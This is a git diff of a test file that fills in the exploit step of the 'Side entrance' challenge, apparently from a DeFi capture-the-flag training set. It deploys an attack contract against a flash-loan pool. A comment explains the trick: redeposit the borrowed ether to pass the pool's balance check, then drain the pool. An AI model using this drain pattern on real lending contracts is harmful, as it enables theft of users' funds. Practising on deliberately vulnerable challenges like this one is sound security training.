@@ -23,8 +23,13 @@ describe('[Challenge] Side entrance', function () {
         ).to.equal(ETHER_IN_POOL);
     });
 
+    /* When execution function is called from flashLoan() method, redeposit msg.value back into the pool to pass require check */
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        console.log("BALL",this.attackerInitialEthBalance);
+        const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceAttack', deployer);
+        const attack = await SideEntranceLenderPoolFactory.deploy(this.pool.address, attacker.address);
+        await attack.connect(attacker).reentrantAttack(ETHER_IN_POOL);
     });
 
     after(async function () {
